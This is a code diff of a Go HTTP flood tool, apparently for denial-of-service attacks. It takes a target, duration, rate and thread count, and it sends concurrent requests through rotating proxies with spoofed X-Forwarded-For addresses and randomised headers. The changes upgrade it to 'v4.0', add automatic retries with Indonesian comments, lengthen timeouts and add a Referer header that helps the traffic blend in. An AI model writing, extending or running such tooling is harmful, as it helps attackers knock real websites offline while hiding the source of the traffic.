@@ -21,8 +21,7 @@ const (
    \__ \ / __// ___// /| |/_/
   ___/ // /_ / /   / /_>  <  
  /____/ \__//_/   /_//_/|_|  
-                            v3.0`
-
+                            v4.0`
 	usage = `Usage: go run main.go <target> <time> <rate> <threads>`
 )
 
@@ -140,6 +139,7 @@ func printBanner(config *Config) {
 	fmt.Println()
 }
 
+// ---- Worker Logic ----
 func workerThread(id int, config *Config, proxies []string) {
 	logger.Printf("Worker Thread %d Started\n", id)
 	client := createHTTPClient(proxies, config.UseProxy)
@@ -159,19 +159,30 @@ func workerThread(id int, config *Config, proxies []string) {
 			go func() {
 				defer wg.Done()
 				req := buildRequest(targetURL)
-				resp, err := client.Do(req)
-				if err != nil {
-					logger.Printf("Request error: %v", err)
-					return
-				}
-				resp.Body.Close()
+				makeRequest(client, req, 3)
 			}()
 		}
 		wg.Wait()
 	}
 }
 
+// ---- Modul Retry Cerdas ----
+func makeRequest(client *http.Client, req *http.Request, retries int) {
+	for i := 0; i < retries; i++ {
+		resp, err := client.Do(req)
+		if err != nil {
+			logger.Printf("Request error (attempt %d): %v", i+1, err)
+			time.Sleep(time.Second * 2) // Tunggu sebelum mencoba ulang
+			continue
+		}
+		defer resp.Body.Close()
+		break
+	}
+}
+
 func createHTTPClient(proxies []string, useProxy bool) *http.Client {
+	timeout := 60 * time.Second
+
 	if useProxy && len(proxies) > 0 {
 		return &http.Client{
 			Transport: &http.Transport{
@@ -181,14 +192,14 @@ func createHTTPClient(proxies []string, useProxy bool) *http.Client {
 					return url.Parse("http://" + proxy)
 				},
 			},
-			Timeout: 10 * time.Second,
+			Timeout: timeout,
 		}
 	}
 	return &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
-		Timeout: 10 * time.Second,
+		Timeout: timeout,
 	}
 }
 
@@ -198,7 +209,7 @@ func buildRequest(targetURL *url.URL) *http.Request {
 	req.Header.Set("Accept", getRandomAccept())
 	req.Header.Set("Accept-Language", getRandomLanguage())
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("Referer", targetURL.String()) // Tambahkan Referer
 	req.Header.Set("X-Forwarded-For", generateIP())
-	req.Header.Set("Origin", targetURL.Scheme+"://"+targetURL.Host)
 	return req
 }
